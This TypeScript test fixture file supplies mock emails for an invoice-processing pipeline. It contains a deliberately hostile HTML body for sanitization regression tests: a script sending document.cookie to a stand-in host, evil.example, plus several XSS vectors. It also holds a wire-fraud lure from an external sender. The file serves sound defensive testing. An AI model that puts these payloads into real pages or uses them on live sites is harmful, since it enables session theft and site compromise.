// ADR-0046 C7/C10 — the default mock-transport fixture set.
//
// Constructed per the C10 taxonomy so the whole pipeline builds + fully tests
// against the mock: a script-bearing HTML body (the sanitization regression
// target), a PDF fileAttachment, a bare forward (no attachment), a one-level
// itemAttachment (nested forwarded message + its own file), a DEEPER nested
// item (item-within-item → visible marker), a referenceAttachment (OneDrive
// link, never fetched), and an EXTERNAL sender (→ quarantine). All internal
// senders are @svdp.us; the external one is not.
//
// `contentBytesBase64` values are tiny placeholder blobs — the pipeline only
// streams them to R2, it never parses them (v1 reads by human, C4).

import type { MockMessageSpec } from '../mock-transport';

const INTERNAL = '@svdp.us';

// A deliberately hostile HTML body — the C10.2 non-negotiable regression fixture.
// Every vector here MUST render inert after sanitize-html.
export const SCRIPT_BEARING_HTML = [
  '<p>Please approve the attached invoice for <b>Acme Mattress Co</b>.</p>',
  '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>',
  '<img src="x" onerror="alert(document.domain)">',
  '<iframe src="https://evil.example/frame"></iframe>',
  '<a href="javascript:alert(1)">click</a>',
  '<div style="background:url(javascript:alert(2))">styled</div>',
  '<p onclick="alert(3)">inline handler</p>',
  '<svg><script>alert(4)</script></svg>',
].join('\n');

const TINY_PDF_B64 = 'JVBERi0xLjQKJcTl8uXrp/Og0MTGCg=='; // "%PDF-1.4" header only — placeholder

export const DEFAULT_MOCK_FIXTURES: MockMessageSpec[] = [
  {
    id: 'msg-pdf-1',
    internetMessageId: '<pdf-invoice-1@svdp.us>',
    conversationId: 'conv-pdf-1',
    receivedDateTime: '2026-07-06T15:00:00.000Z',
    from: `morena${INTERNAL}`,
    fromName: 'Morena (Accounting)',
    subject: 'Invoice approval — Acme Mattress Co #4471',
    bodyHtml: SCRIPT_BEARING_HTML,
    bodyText: 'Please approve the attached invoice for Acme Mattress Co.',
    hasAttachments: true,
    folder: 'inbox',
    attachments: [
      {
        kind: 'file',
        id: 'att-pdf-1',
        name: 'acme-invoice-4471.pdf',
        contentType: 'application/pdf',
        size: 24,
        contentBytesBase64: TINY_PDF_B64,
      },
    ],
  },
  {
    id: 'msg-bare-forward-1',
    internetMessageId: '<bare-forward-1@svdp.us>',
    conversationId: 'conv-bare-1',
    receivedDateTime: '2026-07-06T15:05:00.000Z',
    from: `janette${INTERNAL}`,
    fromName: 'Janette',
    subject: 'FW: Vendor invoice — Beddington Foam',
    bodyHtml: '<p>Forwarding the vendor invoice below for approval — no PDF, it was in the email body.</p><p>Beddington Foam — $1,240.00 — net 30</p>',
    bodyText: 'Forwarding the vendor invoice below for approval. Beddington Foam — $1,240.00 — net 30',
    hasAttachments: false,
    folder: 'inbox',
    attachments: [],
  },
  {
    id: 'msg-nested-1',
    internetMessageId: '<nested-forward-1@svdp.us>',
    conversationId: 'conv-nested-1',
    receivedDateTime: '2026-07-06T15:10:00.000Z',
    from: `morena${INTERNAL}`,
    fromName: 'Morena (Accounting)',
    subject: 'FW: Please pay — Cascade Recycling',
    bodyHtml: '<p>See the forwarded message (with its own PDF) attached.</p>',
    bodyText: 'See the forwarded message (with its own PDF) attached.',
    hasAttachments: true,
    folder: 'inbox',
    attachments: [
      {
        kind: 'nested_message',
        id: 'att-item-1',
        name: 'Please pay — Cascade Recycling',
        nestedSubject: 'Please pay — Cascade Recycling',
        hasDeeperNesting: false,
        nestedFiles: [
          {
            kind: 'file',
            id: 'att-item-1-file',
            name: 'cascade-invoice.pdf',
            contentType: 'application/pdf',
            size: 24,
            contentBytesBase64: TINY_PDF_B64,
          },
        ],
      },
    ],
  },
  {
    id: 'msg-deep-nested-1',
    internetMessageId: '<deep-nested-1@svdp.us>',
    conversationId: 'conv-deep-1',
    receivedDateTime: '2026-07-06T15:12:00.000Z',
    from: `janette${INTERNAL}`,
    fromName: 'Janette',
    subject: 'FW: FW: chained forward',
    bodyHtml: '<p>Chained forward — a message inside a message inside a message.</p>',
    bodyText: 'Chained forward.',
    hasAttachments: true,
    folder: 'inbox',
    attachments: [
      {
        kind: 'nested_message',
        id: 'att-item-deep',
        name: 'FW: chained forward',
        nestedSubject: 'FW: chained forward',
        hasDeeperNesting: true, // item-within-item → visible "nested message" marker, not recursed
        nestedFiles: [],
      },
    ],
  },
  {
    id: 'msg-reference-1',
    internetMessageId: '<reference-link-1@svdp.us>',
    conversationId: 'conv-ref-1',
    receivedDateTime: '2026-07-06T15:15:00.000Z',
    from: `morena${INTERNAL}`,
    fromName: 'Morena (Accounting)',
    subject: 'Invoice in SharePoint — approve please',
    bodyHtml: '<p>The invoice is on SharePoint (link attached). Vision should NOT fetch it.</p>',
    bodyText: 'The invoice is on SharePoint (link attached).',
    hasAttachments: true,
    folder: 'inbox',
    attachments: [
      {
        kind: 'reference_link',
        id: 'att-ref-1',
        name: 'Q3-invoice.pdf',
        sourceUrl: 'https://svdp.sharepoint.com/sites/ap/Shared%20Documents/Q3-invoice.pdf',
      },
    ],
  },
  {
    id: 'msg-external-1',
    internetMessageId: '<external-sender-1@vendor.example>',
    conversationId: 'conv-ext-1',
    receivedDateTime: '2026-07-06T15:20:00.000Z',
    from: 'billing@vendor.example', // EXTERNAL — not @svdp.us → quarantine
    fromName: 'Vendor Billing',
    subject: 'INVOICE ATTACHED - PAY IMMEDIATELY',
    bodyHtml: '<p>Wire $9,900 to the account in the attached PDF today.</p>',
    bodyText: 'Wire $9,900 to the account in the attached PDF today.',
    hasAttachments: true,
    folder: 'inbox',
    attachments: [
      {
        kind: 'file',
        id: 'att-ext-1',
        name: 'invoice.pdf',
        contentType: 'application/pdf',
        size: 24,
        contentBytesBase64: TINY_PDF_B64,
      },
    ],
  },
];
